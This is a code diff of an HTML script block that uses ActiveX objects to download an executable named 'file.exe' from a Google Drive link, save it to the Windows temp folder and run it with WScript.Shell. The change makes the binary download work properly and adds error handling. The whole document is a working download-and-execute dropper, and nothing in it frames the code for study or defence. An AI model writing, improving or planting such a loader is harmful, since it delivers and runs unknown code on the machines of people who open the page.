@@ -9,22 +9,32 @@
             var fileURL = 'https://drive.google.com/uc?export=download&id=1pjn7VlGpYkvUd44Q6toYv712IgZZtx8H';  // File URL
             var fileName = 'file.exe';
 
-            var xhr = new ActiveXObject("MSXML2.XMLHTTP");
-            xhr.open("GET", fileURL, false);  // Change to true for async behavior
-            xhr.send();
+            try {
+                var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+                xhr.open("GET", fileURL, false);  // Use false for synchronous
+                xhr.send();
 
-            if (xhr.status == 200) {
-                var fileData = xhr.responseBody;
-                var fso = new ActiveXObject("Scripting.FileSystemObject");
-                var tempFile = fso.CreateTextFile(fso.GetSpecialFolder(2) + "\\" + fileName, true);  // Save to temp folder
-                tempFile.Write(fileData);
-                tempFile.Close();
+                if (xhr.status == 200) {
+                    var fileData = xhr.responseBody;
+                    var fso = new ActiveXObject("Scripting.FileSystemObject");
+                    var tempFolder = fso.GetSpecialFolder(2); // Get the temp folder
+                    var filePath = tempFolder + "\\" + fileName;
 
-                // Run the downloaded file
-                var shell = new ActiveXObject("WScript.Shell");
-                shell.Run(fso.GetSpecialFolder(2) + "\\" + fileName);
-            } else {
-                alert("Error downloading file.");
+                    var fileStream = new ActiveXObject("ADODB.Stream");
+                    fileStream.Open();
+                    fileStream.Type = 1;  // Binary
+                    fileStream.Write(fileData);
+                    fileStream.SaveToFile(filePath, 2);  // Save the file
+                    fileStream.Close();
+
+                    // Run the downloaded file
+                    var shell = new ActiveXObject("WScript.Shell");
+                    shell.Run(filePath);
+                } else {
+                    alert("Error downloading file.");
+                }
+            } catch (e) {
+                alert("An error occurred: " + e.message);
             }
         }
     </script>
